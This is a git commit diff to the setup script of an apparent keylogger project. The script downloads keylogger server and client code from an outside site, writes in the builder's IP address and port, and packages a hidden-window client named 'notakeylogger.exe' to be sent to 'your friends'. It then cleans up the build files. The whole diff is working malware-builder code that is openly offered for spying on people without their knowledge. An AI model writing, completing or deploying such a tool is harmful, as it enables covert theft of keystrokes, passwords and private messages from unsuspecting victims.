2f7a8b2229c9173127ca0eb6d88564708bc96bba
etheboi <123627006+etheboi@users.noreply.github.com>
2024-03-16 18:07:04 +0000

    Update setup.py

--- assets/keylogger/setup.py
+++ assets/keylogger/setup.py
@@ -1,59 +1,11 @@
 import os
 from time import sleep
-from tkinter import *
+from tkinter import filedialog
 import socket
 import requests
-from tkinter import filedialog
+import shutil
 
-global PORT_ent
-global IP_ent
-
-def setupserver():
-   ServerSetup.destroy()
-   ServerCode = requests.get("https://anonymouskeylogger.netlify.app/assets/keylogger/server.py", allow_redirects=True)
-   os.mkdir("./Keylogger")
-   os.chdir("./Keylogger")
-
-   SR = open("./SERVER_RAW.py", "wb")
-   SR.write(ServerCode.content)
-   SR.close()
-
-   #THIS BIT IS WHERE IT CRASHES
-   PORT = str(PORT_ent.get())
-   IP = str(IP_ent.get())
-   CN = open("./connections.py", "x")
-   CN.write(f"HOST_IP = {IP}\nHOST_PORT = {PORT}")
-   CN.close()
-
-   SI = open("./Server.ico", "wb")
-   output = requests.get("https://raw.githubusercontent.com/etheboi/Keylogger/main/Server.ico", allow_redirects=True)
-   SI.write(output.content)
-   SI.close()
-   os.system('pyinstaller --noconfirm --onefile --console --icon "./Server.ico" --name "Server"  "./SERVER_RAW.py"')
-   #os.remove("./SERVER_RAW.py")
-   #os.remove("./Server.ico")
-
-   ClientSetup = Tk()
-   ClientSetup.geometry("500x300")
-   ClientSetup.title("Client Setup")
-
-   Label(ClientSetup, text="Client Setup").pack()
-
-   Label(ClientSetup, text="\nName").pack()
-   Name_ent = Entry(ClientSetup)
-   Name_ent.pack()
-
-   Label(ClientSetup, text="\nIcon").pack()
-   Icon_fd = filedialog.askopenfilename(initialdir="/", title="Select A File", filetypes=("ico files", "*.ico"))
-   Icon_ent = Entry(ClientSetup)
-   Icon_ent.insert(0, Icon_fd)
-   Icon_ent.pack()
-
-   ClientSetup.mainloop()
-
-
-hostname = socket.gethostname()
-userip = socket.gethostbyname(hostname)
+ip = socket.gethostbyname(socket.gethostname())
 
 print("""
 $$\      $$\           $$\                                             
@@ -66,26 +18,66 @@ $$  /   \$$ |\$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$  |$$ | $$ | $$ |\$$$$$$$\
 \__/     \__| \_______|\__| \_______| \______/ \__| \__| \__| \_______|
 """)
 
-print("Here is where you can keylog your friends easily!")
+print("Want to keylog your friends? Here is where you can!")
+sleep(1)
+print("To start, we need to set up the server!")
+sleep(1)
+print(f"The server will be hosted on {ip}:25595. This is your IP address and the set port.")
+sleep(1)
+input("Press ENTER to start generating the server...")
+
+ServerCode = requests.get("https://anonymouskeylogger.netlify.app/assets/keylogger/server.py", allow_redirects=True)
+os.mkdir("./Keylogger")
+os.chdir("./Keylogger")
+
+SR = open("./SERVER_RAW.py", "wb")
+SR.write(ServerCode.content)
+SR.close()
+
+CN = open("./connections.py", "x")
+CN.write(f"HOST_IP = '{ip}'\nHOST_PORT = 25595")
+CN.close()
+
+SI = open("./Server.ico", "wb")
+output = requests.get("https://anonymouskeylogger.netlify.app/assets/icons/Server.ico", allow_redirects=True)
+SI.write(output.content)
+SI.close()
+os.system('pyinstaller --onefile --icon "./Server.ico" --name "Server"  "./SERVER_RAW.py"')
+print("Removing raw content...")
+os.remove("./SERVER_RAW.py")
+os.remove("./Server.ico")
+os.remove("./connections.py")
+shutil.rmtree("./build")
+os.remove("./Server.spec")
+shutil.move("./dist/Server.exe", "./Server.exe")
+os.rmdir("./dist")
+print("\nComplete!")
+sleep(1)
+input("Press ENTER to set up client to send to your friends!")
+
+print("Downloading files...")
+CF = open("./CLIENT_RAW.py", "wb")
+CF.write(requests.get("https://anonymouskeylogger.netlify.app/assets/keylogger/keylogger.py", allow_redirects=True).content)
+CF.close()
+
+CCN = open("./connections.py", "x")
+CCN.write(f"HOST = {ip}")
+CCN.close()
+
+CI = open("CLIENT_ICON.ico", "wb")
+CI.write(requests.get("https://anonymouskeylogger.netlify.app/assets/icons/warning.ico", allow_redirects=True).content)
+CI.close()
+
+os.system("pyinstaller --onefile -w --icon ./CLIENT_ICON.ico --name notakeylogger ./CLIENT_RAW.py")
+os.remove("./CLIENT_RAW.py")
+os.remove("ClientConnections.py")
+os.remove("CLIENT_ICON.ico")
+shutil.rmtree("./build")
+shutil.move("./dist/notakeylogger.exe", "./notakeylogger.exe")
+os.rmdir("./dist")
+os.remove("./notakeylogger.spec")
+print("\nEverytin is set up!")
+sleep(1)
+input("Have fun :)")
 sleep(2)
-print("Server time!")
-sleep(0.5)
-ServerSetup = Tk()
-ServerSetup.geometry("500x300")
-ServerSetup.title("Server Setup")
-
-Label(ServerSetup, text="ServerSetup").pack()
-
-Label(ServerSetup, text="\nHost IP:").pack()
-IP_ent = Entry(ServerSetup)
-IP_ent.insert(0, userip)
-IP_ent.pack()
-
-Label(ServerSetup, text="\nHost PORT").pack()
-PORT_ent = Entry(ServerSetup)
-PORT_ent.insert(0, 22)
-PORT_ent.pack()
-
-Button(ServerSetup, text="Done", command=setupserver).pack()
-
-ServerSetup.mainloop()
+exit()
